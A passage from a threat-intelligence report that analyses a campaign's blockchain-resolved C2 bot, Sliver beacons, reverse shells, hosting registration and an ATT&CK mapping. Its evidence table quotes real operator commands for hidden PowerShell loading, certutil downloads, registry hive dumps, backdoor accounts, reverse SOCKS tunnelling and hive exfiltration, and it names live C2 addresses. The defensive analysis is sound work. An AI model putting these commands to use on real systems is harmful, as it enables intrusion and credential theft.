Calldata is the selector `0x7d434425` followed by the argument address left-padded to 32 bytes. It is sent as `eth_call` to **all seven RPC providers in parallel**, the decoded string is required to match `/^(https?|wss?):\/\//`, and the bot then takes a **majority vote** across the providers that answered, counting identical responses and picking the most common. A single hostile or misconfigured provider cannot redirect it. That is a deliberate integrity control and the strongest indicator of engineering care anywhere in this toolkit. The seven endpoints are mainstream keyless public infrastructure, so the traffic looks like ordinary web3 activity.

Polling builds a URL designed to look like a static asset request, carrying a custom `X-Bot-Server` header:

```
<C2>/api/<4 random bytes hex>/<bot id>/<4 random bytes hex>.<png|jpg|gif|css|ico|webp>?<id|token|key|b|q|s|v>=<build id>
```

Any response longer than ten bytes is executed as the body of an async function built through `Object.getPrototypeOf(async function(){}).constructor`. That is the AsyncFunction constructor, functionally equivalent to `eval` and invisible to detection looking for `eval(` or `new Function(`. The handler receives `require`, `process`, `Buffer`, `console`, `__dirname`, `__filename` and a logging helper, so a task arrives with the full Node API and therefore full user-context capability. There is no fixed command set to enumerate, which is why the capability assessment for this strand is bounded by the interpreter rather than by the implant.

Server-side re-obfuscation is built in. On first run the bot POSTs its own source back to the C2 as a `{code, build}` object and writes whatever comes back as the copy it will run next time, with a config flag stopping it from repeating. No two victims run a hash-matchable copy, by design. File-hash detection across victims is defeated at the architecture level rather than by obfuscation, and that is why the detection rules for this family key on the fixed operational constants instead.

The install directory blends into `%LOCALAPPDATA%` using names drawn from a list including `Google`, `Microsoft`, `Windows`, `Extensions`, `Components`, `Modules`, `Packages`, `Programs`, `Services` and `Assemblies`. Those are directory-name camouflage and nothing more. **No browser-credential or extension theft** is evidenced anywhere in this bot, and reading those directory names as browser theft would be over-claiming a capability the code does not have. Its reconnaissance is limited to the computer name, the user name, a handful of profile paths and the hostname.

</details>

### The contract, and what it proves

The resolver contract at `0xb3f2897f2bc797e5b9033faef8c81e92b01cb831` exposes six functions. Only one was ever exercised as the C2 getter. Four return hardcoded constants and ignore their arguments, and the setter is **permissionless**, writing to a mapping keyed by `msg.sender`.

That permissionless design has a consequence worth stating plainly for defenders, because it cuts against the instinct to look for a takedown. Anybody can write to this contract, but each writer only ever writes to their own entry, so nobody can overwrite the operator's value, including us. There is no seizure lever, no registrar to serve, and no host to notify. Polling is not a limitation of anyone's access, it is the only move the design permits.

The contract emits an event on every write, and enumerating those events over the contract's full range returns exactly five writes from one signing address across six transactions that are its entire lifetime. That makes the rotation history **complete rather than a sampled lower bound**, which is a stronger claim than this case was originally careful enough to make, and it holds at DEFINITE.

| Nonce | Block | Set at (UTC) | Value |
|---|---|---|---|
| 0 | 24,777,993 | 2026-03-31 13:49:11 | contract deployed |
| 1 | 24,783,833 | 2026-04-01 09:24:11 | `https://publisherresolution.com` |
| 2 | 24,980,089 | 2026-04-28 17:35:11 | `https://resumeacceptable.com` |
| 3 | 25,302,771 | 2026-06-12 17:06:35 | `https://simultaneouslypower.com` |
| 4 | 25,345,369 | 2026-06-18 15:33:35 | `https://wiselystarting.com` |
| 5 | 25,437,624 | 2026-07-01 12:19:59 | `https://itemrange.com` |

Across the whole five-month history no second address has ever called the setter. The design says shared resolution surface and the observed use says single tenant, and both halves of that are worth keeping.

I am deliberately not describing this contract as a currently maintained C2. The last write is the one at block 25,437,624 on 2026-07-01, and no public reporting has re-examined the contract since Hunt.io's disclosure on 2026-08-04. That is an absence of reporting rather than evidence of dormancy, and neither reading is supported well enough to publish.

### Where this technique comes from

The on-chain resolver is not this operator's invention, and the lineage is measurable rather than impressionistic. Within the publicly documented EtherRAT branch of this technique, this is the **fifth contract reported in nine months**, following one documented by Sysdig on 2025-12-08 (written up independently by ASEC four days later), one by eSentire on 2026-03-25, and one by Atos in April 2026. The underlying idea of reading C2 from a chain predates all of them, appearing in NPM supply-chain packages documented in July 2025 using a simpler single-endpoint version with no consensus vote.

Five documented instances in one named technique family is not a measured census of blockchain C2 generally, so I am not going to tell you this is an emerging trend. I have not counted the denominator that claim would need. What I can say is dated and narrow, and it is enough to be useful.

What this build is, then, is an independent Windows-native implementation of the same publicly documented technique, and not a shared codebase. The polling URL shape, the self-re-obfuscation call and the consensus-vote resolution all match the published pattern closely enough to establish the technique lineage. The shared getter and setter interface is deliberately excluded from that argument, because a string-returning mapping is a textbook Solidity idiom whose denominator is effectively everyone who has ever written one. And a shared builder is ruled out separately at HIGH confidence in Section 11, on bytecode that differs from all three sibling contracts in length, embedded source hash and function set.

### The wallet behind the contract

One wallet deployed the contract and signed every write. Its funding traces back through a single-use intermediate hop to **an HTX exchange hot wallet**, confirmed against two independent block explorers that agree on the exchange while disagreeing on which numbered instance it is, so the exchange is named here and the instance number is not.

That trace is the most actionable attribution lead this case produced, and it is worth being precise about what kind of lead it is. The exchange itself is institutional context rather than operator-authored evidence, so it links nothing on its own and carries no confidence label of its own. Its value is that a KYC-bearing exchange sits one hop behind a timestamped withdrawal, which makes it a target for legal process rather than a technical pivot. The funding path itself, the deployer wallet and its single-use hop, is unique by construction and is operator-authored.

There is an irony in that hop worth recording without over-reading. Adding an intermediate address looks like better tradecraft than sending straight from an exchange, and here it is strictly worse, because the exchange it routed through keeps records. I do not have enough to say which way that cuts. It is tempting to read it as an operator new to this technique, and I am declining to, because an experienced group may simply have used what was available to them that day. Both readings stay open and neither is load-bearing anywhere in this report.

---

## 7. Infrastructure and Registration
{: .hl-tier-2}

The hosting is a mixed stack rather than one bulletproof provider, and the registration pattern behind the domain-rotation layer turned out to carry more signal than any single address did.

### The host does not have a country, and that is the finding

Anyone who looks up `193.233.202.17` will get a country back, and whichever one they get will be incomplete. Live geolocation sources disagree with each other on this address, and the registry data disagrees with itself at different levels of the allocation. Rather than pick one, here is the whole structure with the object each part comes from.

The `/24` that actually covers this host is the most specific object, it is named `Netcrafters-OU`, its RDAP **country field reads US**, and its registrant is NetCrafters OU. That registrant's own contact record declares a postal address in Kohtla-Jarve, Estonia. The `/24` sits inside a `/23` named `AGROSNAB-NET-233-202`, a direct structural relationship rather than an inference, and that `/23` carries **country RU**, with OOO AGROSNAB as registrant and administrative and technical contacts declaring addresses in Yekaterinburg. Both netblocks share a single Russian maintainer object, `mnt-ru-am-1`. The autonomous system announcing all of it, AS203273, **carries no country field at all**.

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/sliver-c2-windows-postex-staging-193-233-202-17/sliver-c2-as203273-rdap-layers.svg" | relative_url }}" alt="Vertical four-layer infographic titled The Host Has No One Country, subtitled Four RDAP objects, four different answers, all correct. Layer 1, grey band, AS203273, NetCraftersOU: no country field anywhere on the ASN object itself, though its registrant declares a postal address in Kohtla-Jarve, Ida-Viru maakond, Estonia, so the Estonian reading is a declared address plus an OU company-form inference, not a registry field. Layer 2, grey band, slash-23 sub-allocation AGROSNAB-NET-233-202: a separate object one step down, with country explicitly RU, registrant OOO AGROSNAB in Yekaterinburg, type SUB-ALLOCATED PA, not yet the object that covers the host. Layer 3, yellow band, slash-24 assignment Netcrafters-OU, the most specific object: this is the object that actually covers 193.233.202.17, type ASSIGNED PA, country US, sitting one layer inside the Russian slash-23, and the most-specific object is the one that should govern a lookup; detection hint notes live GeoIP tools read whichever layer their database last cached. Layer 4, deep red band, Synthesis, Never Write a Single Country: one maintainer, mnt-ru-am-1, holds both the slash-23 and the slash-24, so the Russian and US-flagged objects are not arm's-length parties; Securebit AG also appears on the ASN object as a RIPE sponsoring LIR, not a link. Footer states there is no detection anchor since this is a registration-mechanics finding, and that it was verified directly against the raw RDAP objects and independently re-derived twice with identical results, plus a color legend.">
  <figcaption><em>Figure 3: The four separate RDAP objects behind one IP address, read top to bottom from the broadest to the most specific. The most-specific object, the one that actually covers this host, is the one most reports would miss, and it is the one that disagrees with the inferred "Estonian" reading.</em></figcaption>
</figure>

One distinction makes that picture readable instead of merely contradictory. A declared postal address is contact data the registrant supplied about itself, so the Estonian address is the registrant's own claim. The country field is a structured value on the allocation object, closer to a registry assertion, though even that traces back to whoever requested the allocation. So the Estonian reading is real and sourced, and it is not a registry adjudication that this operator's host sits in Estonia. Treat any single-country label on this address as a lossy summary of the above.

The AS203273 record also lists Securebit AG, a Swiss company, in administrative, technical and registrant roles. That is a RIPE sponsoring-LIR relationship, which necessarily makes the sponsor a contact on every ASN it sponsors, so it is a service-supplier relationship rather than a link to anything. Nobody has measured how many autonomous systems it sponsors, so it is **NOT CHECKED** and it is recorded here mainly so the next person to notice it does not have to run the same check again.

### This address has had many tenants

Fourteen distinct certificate identities appear on `193.233.202.17` between 2022-09-05 and 2026-08-24, across ports 443, 631, 3389 and 8181, alongside nine distinct JARM groups. That is a churning address rather than a stable machine, and it changes what the pre-campaign history is worth. Artifacts older than this campaign probably belong to different tenants, so the earlier certificate names on this address are not this operator's and should not be pivoted on.

That churn also disposes of an apparent link that looks exactly like a real one. The current port-3389 JARM fingerprint on this host is byte-identical to a port-3389 JARM on `77.110.126.46`, which is the shape of strong infrastructure overlap. It is not one. Measured across the corpus, that fingerprint appears on 1,307,847 unique address and port pairs, which puts it firmly in hosting context. It also fails on ownership, because a JARM is produced by the RDP and TLS stack, which is Microsoft's work rather than the operator's, so a shared value links that supplier's customers rather than these operators. Graded **INSUFFICIENT**, and it is not in the feed.

The same applies to the current certificate common name on port 3389, which has the shape of a provider-generated instance label, and to a Windows auto-generated self-signed certificate found on the other address. All three are RDP-layer artifacts on this provider's hosts, and all three are generated by the provider or the operating system rather than authored by the operator. The RDP layer on this provider tells you about the provider.

I checked a second address that a vendor placed in the same article, `77.110.122.137`, and it does not link either. It shares only the autonomous system with our host, with no shared certificate fingerprint, no shared JARM, no shared SSH host key and no overlapping certificate subject across ten distinct certificate identities in fifteen months. Two addresses appearing in one write-up is not a link.

### The secondary addresses, and how to handle them

`77.110.126.46` is hunt-only and must never be blocked. Operator use is certain, because it is hardcoded as a third-tier fallback inside four binaries (`ws35.exe`, `ws36.exe`, `ws37.exe` and `ws_3srv.exe`), which is operator-authored evidence of a different class from anything the hosting can tell you. Ownership of the box is a separate question and it stays **NOT ESTABLISHED**. Two independent methods both show low identity churn there, which rules out the reassignment explanation but does not discriminate between a compromised third party and an operator-owned host. Blocking an address whose owner is unknown risks a bystander for no gain against an operator who has already demonstrated they rotate.

One correction matters here, because the natural assumption about that address is wrong. A domain that formerly resolved to it is seized and sinkholed infrastructure rather than a third party's own service, so do not reason about it as a bystander's server. Four file hashes shared between the address and that domain remain unidentified, and that is a named gap rather than a checked negative.

`146.103.127.44` is historical only. It was operator-used in April 2026, it appears in six filenames across five unique binaries, and the address has since been reassigned to an unrelated occupant. Monitor it, do not block it.

### Domain registration, and the one strong fingerprint

The operator's domain discipline is genuinely good and it is the reason there is no portfolio to pivot into. Every C2 domain is registered under a fresh persona with no reuse across registrations, which is discipline rather than the sloppiness that usually leaks an actor's wider estate. The set splits two ways on registrar behaviour as well, some pre-registered ahead of need and some registered just in time.

Against that, one string does not vary. The literal WHOIS registrant city `Avenel, CA, US` recurs verbatim across three separately registered, differently personaed C2 domains while every other field differs between them. That is consistent with a registration tool writing a hardcoded default into every record it creates.

The confidence on that splits by what you want to use it for, and the split is the honest handling rather than a hedge. As evidence that these three domains were registered by the same process, it is **STRONG**. As a pivot to find infrastructure outside this set, it is **NOT CHECKED**, because nobody has established whether the registration tool is bespoke to this operator or a commodity one used by thousands, and the reverse search that would measure it is blocked for want of a credential. If the tool turns out to be commodity, the string identifies the tool's users rather than these operators, and a hunt built on it would return strangers.

### Rotation tempo

Baseline rotation through the resolver contract ran at roughly four to six weeks. One interval breaks that pattern, a six-day rotation bracketing the seizure of a domain the operator had been using, on 2026-06-19. I read that as the operator reacting to an external event at **MODERATE** confidence, and the alternative is genuinely open. Six days is a short enough window that two routine rotations could bracket that date by coincidence.

The most recent C2 domain moved hosting on 2026-09-05, from a dedicated address to a bulk-abused shared host carrying 1,747 hostnames since 2019, with the contract value unchanged. It remained there through this investigation's last check on 2026-09-06, which is where I stop that claim. Moving onto crowded shared hosting is a deliberate choice worth noticing, because it makes address-level blocking expensive for defenders and buys the operator cover they did not have on a dedicated box.

Across the whole portfolio, bulletproof hosting is **SUSPECTED rather than CONFIRMED**. No single provider in the set clears three or more of the usual indicators. The hosting investment is asymmetric in a way that maps onto the two strands, with cheap self-signed infrastructure on the Sliver side and geographically diverse rotating domains and hosts on the blockchain-resolved side.

---

## 8. Static Analysis Findings
{: .hl-tier-3}

The binaries turned out to be simpler than they looked, and the correction is worth leading with because the first reading of this corpus got it wrong in an instructive way.

Roughly two dozen numbered Go executables sat in the directory sharing an import hash and a size band, and they were carried for some time as probable Sliver implants. They are not. They are plain reverse shells. Each one dials a single hardcoded `host:port`, hands `cmd.exe` to the socket, and retries every thirty seconds with a ten-second connect timeout. The operator's own source filenames say so, recovered from build metadata as `/tmp/revshell37.go`, `/tmp/shell_39.go` and `/tmp/build_nc/main.go` among others. Each program's main package holds between 11 and 33 functions, against 1,093 for the Chisel build and 1,517 for Ligolo, so they are tiny programs by any measure.

That correction is what made the port map legible. Each build carries its own destination port, twenty of them across the set, which finally explains the seventy-four open ports observed on the operator's host since July. One listener per victim host, allocated in sequential blocks.

Every one of the 29 Go binaries carries a distinct build identifier, which is real evidence of 29 separate build actions rather than one binary copied around and renamed. Per-target recompilation remains my best reading of that, supported by the filename convention and the per-build port map. I hold it as a well-supported inference rather than a settled fact, because a build identifier hashes the whole build action including flags and toolchain, so distinct identifiers prove separate builds without proving different source.

### The one tool they modified

<details markdown="1" class="hl-teardown">
<summary>svcload.exe, a PrintSpoofer derivative with its diagnostics stripped and its telltale strings moved onto the stack</summary>

`svcload.exe` is 43.5 KB and it is the only compiled artifact in the kit the operator changed. It is a PrintSpoofer derivative whose operator-facing console output has been removed entirely and whose signature-bearing strings are constructed on the stack at runtime rather than stored as literals. Extracting those stack-built strings recovers:

```
\pipe\spoolss                 the Print Spooler named pipe
\\.\pipe\%ws\pipe\spoolss     the pipe-path format string
SeImpersonatePrivilege        the privilege the whole Potato family depends on
WinSta0\Default               window station for the spawned process
D:(A;OICI;GA;;;WD)            SDDL granting Generic All to Everyone
```

The SDDL string is the operative detail. `WD` is the World SID, so the tool creates a named pipe that anything can connect to, which is how the privileged spooler service gets induced to connect so its token can be stolen.

The comparison is direct rather than inferred, because stock PrintSpoofer sits in the same directory still carrying `[-] Failed to connect the named pipe.` and `CreateNamedPipe() failed. Error: %d` as plain literals. The operator did not rename a public tool. They rebuilt a public technique to be quieter, and that is a deliberate detection-evasion decision rather than something an off-the-shelf assembler produces.

This file is also the only PE in the kit carrying a real operator build timestamp, 2026-04-16, which made it the best reverse-engineering target available and is why the comparison could be made at all.

</details>

### What is stock, and why that matters for detection

The rest of the compiled tooling identifies itself. mimikatz is present at full public capability. JuicyPotato, PrintSpoofer, GodPotato and Chisel are all stock builds, and `svcefs.exe` is stock EfsPotato calling `EfsRpcEncryptFileSrv` directly. Neither .NET binary carries a PDB path or build directory, so no operator machine name, username or project path leaks from any of them.

Chisel and Ligolo-ng looked linked by a shared import hash for a while, which would have been a nice finding. Their Go compiler versions differ, which settles it as coincidence rather than a shared build environment.

None of this stock tooling should be turned into campaign detection content, and that is a deliberate exclusion rather than an oversight. A rule keyed on a mimikatz banner string, a PrintSpoofer error message, a Chisel README example or a GodPotato CLSID identifies the public tool, not this operator, and it will fire on every unrelated intrusion and every red team that reaches for the same shelf.

---

## 9. Dynamic Analysis Findings
{: .hl-tier-3}

Everything in this section is the implant's own behaviour rather than an inference from its bytes.

### The beacon, and the mistake in its configuration

The implant beacons to `193.233.202.17` on two ports at once, 295 packets to port 443 and 191 to port 80. Each cycle is a pair of connections, a TLS session to 443 followed roughly 40 milliseconds later by a plaintext HTTP POST to 80, from consecutive ephemeral source ports.

Port 80 on this host is a C2 listener rather than a misconfigured web server. An external probe in July had already recorded that it accepts TCP but does not speak HTTP, timing out at the application layer, and the implant using it as a beacon channel confirms that reading rather than merely being consistent with it.

The timing is the part a defender should care about most:

```
deltas: 60 60 60 60 60 60 60 60 60 60 60   (seconds)
jitter across 11 intervals: 0
```

Sixty seconds, dead on, every time. Sliver supports jitter and this operator did not configure it, so the callback is perfectly periodic. That is trivially detectable by beacon analysis and it is the kind of thing a careful operator would have changed. It is also the single most durable detection property in this case, because it survives every address, port, domain and path rotation the operator performs. For an operation that put real engineering into surviving takedowns, leaving the heartbeat at a flat sixty seconds is a striking omission.

### The request profile

<details markdown="1" class="hl-teardown">
<summary>Twelve beacons, twelve generated URIs, and the User-Agent that cannot exist</summary>

Twelve beacons produced twelve distinct request URIs, every one a POST:

```
/bundles/scripts/script/app.min.php?z=3688i72463017
/scripts/scripts/app.min.js?j=b403476c168796
/scripts/bundles/app.js?w=243841148754
/script/bundles/scripts?o=440440871832
/scripts/bundles/script/route.js?j=9329g9919t2
/script/script/javascripts/bundles/app.min.js?b=502801789275
/scripts/script/javascripts/app.min.js?w=335054256888
/scripts/bundles/route.js?f=2377x89986470
/script/script/array.php?s=6q5409v5756295
/javascripts/bundles/route.php?f=234385377545
/javascripts/bundles/scripts/javascripts/app.min.js?e=52304h803x6632
/bundles/bundles?v=48p0154370505
```

The generator is visible in its own output. Path segments come from `script`, `scripts`, `bundles` and `javascripts`, composed two to five deep. The terminal filename is one of `app.min.js`, `app.js`, `route.js`, `route.php`, `array.php`, `app.min.php`, or absent. The query is a single letter from `z`, `j`, `w`, `o`, `b`, `f`, `s`, `e` and `v`, followed by an alphanumeric value. Bodies run 294 to 2,691 bytes, and the declared content type rotates across `text/plain`, `application/x-gzip` and `image/png` as camouflage while the bodies carry the same kind of encoded payload throughout.

The anomaly worth hunting is the method rather than the paths. Static assets are fetched with GET. This profile POSTs several hundred bytes to paths shaped like minified JavaScript, which should not happen in ordinary traffic regardless of destination.

The User-Agent is identical across all twelve beacons and it is internally impossible:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.6602.492 Safari/537.36
```

Chrome 108's stable builds are versioned `108.0.5359.x`. A build number of 6602 belongs to a far later major version, so the major version and the build number contradict each other and no real browser ever produced this string. It is compiled into the implant's build profile, which makes it a rotation-surviving anchor rather than an infrastructure artifact that dies with the next address change.

</details>

### What the implant did not do

The negatives here are as useful as the positives, and each one carries its denominator so you can tell a real absence from a broken observation.

It resolved no operator domain. 165 DNS queries were observed and every single one is operating-system or third-party background noise. Not one operator-controlled name. That matches the static picture exactly, since a raw-byte scan of the related builds found zero URLs and zero domain-shaped tokens. This implant family resolves nothing, it beacons to a raw address, so anyone hunting it on DNS telemetry alone will not see it at all.

It touched neither disk nor registry. Exactly 269 events were attributed to the implant process, being one process start, 23 thread creations of which 16 land in the first second as the Go runtime spins up, and 245 network operations. Zero file operations and zero registry operations.

That negative is worth its denominator, because an empty result and a broken capture look identical from outside. The same trace recorded 138,163 file writes and 21,013 registry value writes across other processes, so file and registry activity was demonstrably being captured. A full registry export taken before and after is byte-for-byte identical, and an autostart comparison reports zero new entries and zero removed.

So the Sliver beacon does not self-persist and leaves no host artifact at all while it waits for tasking. Every bit of persistence in this campaign comes from the operator's own scripts, tasks and Run-key writes, which is a materially different hunting problem from a self-installing implant.

**It did not contact either secondary address** during the observation window, which is consistent with those being genuine fallbacks rather than primaries, though the window is not long enough to prove a fallback would never fire.

### What process memory gave up

The implant named its own framework while running:

```
Z-github.com/bishopfox/sliver/protobuf/sliverpb
```

Every earlier Sliver call on this case was inference from third-party verdicts or from surviving getters. This is the implant saying it directly.

The full protobuf schema is resident alongside it, and it reads as an inventory of what the operator can do once a beacon checks in.

| Message | What it establishes |
|---|---|
| `sliverpb.BeaconRegister` with `.Jitter`, `.NextCheckin` | beacon mode, not an interactive session implant |
| `sliverpb.Register` with `Uuid`, `Username`, `Uid`, `Gid`, `Os`, `Arch`, `Pid` | host fingerprint sent on registration |
| `sliverpb.InvokeMigrateReq` with `ProcName` | process migration |
| `sliverpb.PivotType` with `TCP`, `UDP`, `NamedPipe` | pivoting across three transports |
| `sliverpb.Ifconfig`, `NetInterface` | internal network enumeration |
| `sliverpb.UploadReq` | file transfer onto the victim |

Two things memory did not give up, and both are recorded as gaps rather than glossed. The Sliver version string is absent, consistent with symbol obfuscation stripping it. The numeric beacon interval and jitter values live in serialised protobuf rather than as text, so the network answered those instead of memory.

> **A near miss worth publishing, because the lesson generalises.** The first memory search returned nothing at all, including for the C2 address, and was one step from being written up as "the implant holds no plaintext C2 in memory". A control caught it. A search for `kernel32` in the same 9.1 MB extraction from a Windows process also returned zero hits, which is impossible. The search method was broken, not the sample. Redone with the control passing at 130 hits, every answer above reversed. An empty result is not an absence unless the check can prove it was capable of finding something.

### TLS fingerprints, and why I am not offering them

Across 92 TLS sessions from the implant to the C2 there is exactly one JA3 value, one JA4 value, and no SNI on any of them. One fingerprint with no variation across 92 sessions is what a Go TLS stack produces, a fixed client hello with no randomisation.

The JA3 was then measured and the measurement kills it. It sits on **3,645 distinct hosts** in a scanner-signal corpus of 457,828, with a working control, and nothing in that corpus associates it with Sliver. It is commodity Go TLS. Graded **INSUFFICIENT**, and that grade rests on a measured denominator plus a positive commodity identification, which is a stronger negative than simply not having looked. I am not publishing it as an indicator and there is no rule on it.

JA4 is NOT CHECKED and it is explicitly not a fallback. Two services were tried and neither could answer, for two different reasons. One has no field recording a connecting client's JA4 at all, and the other's free-text search endpoint was confirmed broken against known-positive controls in the same session. The no-SNI-to-bare-IP combination is unmeasured for the same reason. Offering an unmeasured fingerprint as a substitute for a measured-and-rejected one would repeat the exact mistake, one step to the left.

What the fingerprint is still good for is hunting inside an environment already suspected of this intrusion, where the base rate does not matter because the question is whether this beacon is present rather than whether it is unique in the world. Paired with the URI profile and the destination it is useful. Published alone as an indicator it would be a liability.

---

## 10. MITRE ATT&CK Mapping
{: .hl-tier-2}

Fifty-nine techniques map to this campaign across eleven tactics, 54 of them at HIGH or DEFINITE and 5 at MODERATE. The concentration tells you what kind of operation this is. Command and Control carries eleven techniques and Defense Evasion nine, which is where an operator building for a long stay spends their effort, while Execution and Discovery carry the breadth you would expect from someone who already had access and was working out what they had reached.

Two tactics are deliberately empty, and the reason is worth more than the rows would have been.

Impact maps to nothing. No encryptor, wiper or recovery-inhibition artifact exists anywhere in this corpus. Third-party reporting describes this infrastructure as ransomware-adjacent and that is a different kind of claim from anything the recovered files support. Mapping an Impact technique on the strength of the association would be assuming the family rather than reading the evidence.

Initial Access maps to nothing. No delivery artifact was recovered. Everything in the directory presumes access already exists, which is exactly what a post-exploitation staging kit looks like.

Two further exclusions are worth naming so nobody re-adds them. Anti-debug hits on the Go binaries are Go runtime behaviour rather than operator code, so T1622 is not mapped. Zeroed Go build timestamps are a compiler artifact and a 2068 timestamp on one .NET assembly is a build-tool overflow, so neither is timestomping and T1070.006 is not mapped.

The mapping uses ATT&CK v19.2. The T1562 Impair Defenses tree was revoked in that version and its members promoted to top-level techniques under the new Defense Impairment tactic, so the two rows that would once have read T1562.001 and T1562.004 are now T1685 and T1686.

<details markdown="1" class="hl-teardown">
<summary>The full 59-technique mapping, with the evidence for each row</summary>

> **Confidence note:** all rows below are HIGH confidence unless explicitly marked `(MODERATE)`. The Confidence Summary in Section 14 organises findings by confidence level for the higher-level view.

| Tactic / Technique | Name | Evidence |
|---|---|---|
| Resource Development / T1588.002 | Tool | mimikatz, JuicyPotato, PrintSpoofer, GodPotato, Chisel v1.11.5, Ligolo-ng, Sliver |
| Resource Development / T1608.001 | Upload Malware | 81-file open directory on `:8080` and `:8088`, plus six staging ports |
| Execution / T1059.001 | PowerShell | 13 operator scripts; `-ep bypass -w hidden -NonInteractive -c iex(...)` |
| Execution / T1059.003 | Windows Command Shell | `.bat` and `.cmd` deploy chain; `exec.Command("cmd.exe")` bound to a socket |
| Execution / T1059.007 | JavaScript | Node.js bot; AsyncFunction constructor used as an `eval` substitute |
| Execution / T1053.005 | Scheduled Task | Remote `schtasks /create /s <host> ... /ru SYSTEM /f` then `/run` |
| Execution / T1047 | Windows Management Instrumentation | `wmic /node:<host> process call create` fallback in the deployment chain |
| Execution / T1218.007 | Msiexec | `msiexec /i <path> /quiet /norestart`; also Defense Evasion |
| Execution / T1106 | Native API | `VirtualAlloc` then `Marshal.Copy` then `VirtualProtect` RX then `CreateThread` |
| Persistence / T1053.005 | Scheduled Task | Weekly SYSTEM task, forged author, fileless `iex` re-pull on each run |
| Persistence / T1547.001 | Registry Run Keys | `HKCU\...\Run\WindowsHost` = `conhost --headless "<node.exe>" "*.bak"` |
| Persistence / T1136.001 | Local Account | `net user ... /add`, then Administrators and Remote Desktop Users |
| Persistence / T1136.002 | Domain Account | AD account created with `userAccountControl = 66048` |
| Persistence / T1098 | Account Manipulation | Added straight to Domain Admins; script echoes `ADDED_TO_DA_OK` |
| Persistence / T1078.002 | Domain Accounts | One backdoor credential reused across seven deployment scripts |
| Privilege Escalation / T1134.001 | Token Impersonation/Theft | `WTSQueryUserToken` with `ImpersonateLoggedOnUser`; `ImpersonateNamedPipeClient` |
| Privilege Escalation / T1134.002 | Create Process with Token | `CreateProcessWithToken`, `DuplicateTokenEx` |
| Privilege Escalation / T1068 | Exploitation for Privilege Escalation | MS16-032 / CVE-2016-0099, named in the script's own comment |
| Privilege Escalation / T1548.002 | Bypass User Account Control | `LocalAccountTokenFilterPolicy` = 1 and `EnableLUA` = 0 |
| Defense Evasion / T1027 | Obfuscated Files or Information | Go symbol and string obfuscation, 273 of 282 package roots mangled |
| Defense Evasion / T1140 | Deobfuscate/Decode Files or Information | `e[i] ^ k[i % 64] ^ (i & 255)`; base64 fragment reassembly |
| Defense Impairment / T1685 | Disable or Modify Tools | 8 endpoint-protection services stopped and disabled; DNS-filter whitelist via its own API |
| Defense Impairment / T1686 | Disable or Modify System Firewall | RDP firewall rule group enabled by the capstone script |
| Defense Evasion / T1036.005 | Match Legitimate Name or Location | `svchost_update.exe`, `csvc.exe`, `upd.exe`, `%APPDATA%\svchost.log` |
| Defense Evasion / T1070.004 | File Deletion | MSI `RemoveTempFiles` (`*.*`), `RemoveTempDir`, `Cleanup` |
| Defense Evasion / T1620 | Reflective Code Loading | `[Reflection.Assembly]::Load()` on a downloaded base64 blob |
| Defense Evasion / T1112 | Modify Registry | Six policy values across UAC, RDP and NLA |
| Defense Evasion / T1055 | Process Injection | `sliverpb.InvokeMigrateReq` with `ProcName` resident in memory (MODERATE) |
| Credential Access / T1003.001 | LSASS Memory | `MiniDumpWriteDump` to `C:\Windows\Temp\ls.dmp`; mimikatz v2 in the kit |
| Credential Access / T1003.002 | Security Account Manager | `reg save HKLM\SAM` to `C:\ProgramData` |
| Credential Access / T1003.004 | LSA Secrets | `reg save HKLM\SECURITY` to `C:\ProgramData` |
| Credential Access / T1555.003 | Web Browsers | mimikatz browser-credential capability present, not observed used (MODERATE) |
| Discovery / T1087.002 | Domain Account | `DirectorySearcher` on `sAMAccountName`, `badPwdCount`, `lockoutTime` |
| Discovery / T1069.002 | Domain Groups | `memberOf`, and an `adminCount=1` filter hunting privileged accounts |
| Discovery / T1482 | Domain Trust Discovery | Tagged on the capstone script by third-party analysis (MODERATE) |
| Discovery / T1082 | System Information Discovery | `sliverpb.Register` carries `Os`, `Arch`, `Uuid`; bot reads `os.hostname()` |
| Discovery / T1033 | System Owner/User Discovery | `whoami`; bot reads `USERNAME` and `USERPROFILE` |
| Discovery / T1016 | System Network Configuration Discovery | `sliverpb.Ifconfig` and `NetInterface` resident (MODERATE) |
| Discovery / T1135 | Network Share Discovery | `ADMIN$` and `C$` reachability probes |
| Discovery / T1046 | Network Service Discovery | DNS-filter appliance PostgreSQL probe on TCP 5432 |
| Discovery / T1518.001 | Security Software Discovery | Endpoint-protection service state queried and reported over the shell |
| Lateral Movement / T1021.002 | SMB/Windows Admin Shares | `net use`, `xcopy`, `Copy-Item` with a `PSCredential` |
| Lateral Movement / T1021.001 | Remote Desktop Protocol | RDP enabled, NLA disabled, RDP capability in three builds |
| Lateral Movement / T1021.006 | Windows Remote Management | `Invoke-Command -ComputerName` against the DNS server over WinRM |
| Lateral Movement / T1570 | Lateral Tool Transfer | `certutil -urlcache -split -f` into an admin share |
| Lateral Movement / T1563.002 | RDP Hijacking | Tagged on the capstone script by third-party analysis (MODERATE) |
| Collection / T1005 | Data from Local System | SAM, SYSTEM and SECURITY hives saved to disk |
| Collection / T1074.001 | Local Data Staging | Hive backups and enumeration output staged in `C:\ProgramData` and `C:\Windows\Temp` |
| Command and Control / T1071.001 | Web Protocols | POST beacons on `:80` and TLS on `:443`, 486 packets observed |
| Command and Control / T1573.002 | Asymmetric Cryptography | Sliver mTLS with server certificate pinning |
| Command and Control / T1102.001 | Dead Drop Resolver | `eth_call` selector `0x7d434425`, majority vote across 7 RPC providers |
| Command and Control / T1008 | Fallback Channels | Three-tier hardcoded C2 list |
| Command and Control / T1104 | Multi-Stage Channels | MSI to `.cmd` to JS decryptor to bot to contract to C2 |
| Command and Control / T1105 | Ingress Tool Transfer | `certutil -urlcache`, `Net.WebClient.DownloadString`, `curl.exe` |
| Command and Control / T1571 | Non-Standard Port | 20 hardcoded high ports, one per build |
| Command and Control / T1572 | Protocol Tunneling | Chisel `client <ip>:22673 R:socks`; Ligolo-ng agent |
| Command and Control / T1090 | Proxy | Reverse SOCKS makes the victim the operator's entry proxy |
| Command and Control / T1132.001 | Standard Encoding | Base64 transport for the reflective payload; base64 JSON bot config |
| Exfiltration / T1041 | Exfiltration Over C2 Channel | HTTP PUT of three registry hives to `/upload_<name>` on port 42718 |

</details>

---

## 11. Threat Actor Assessment
{: .hl-tier-2}

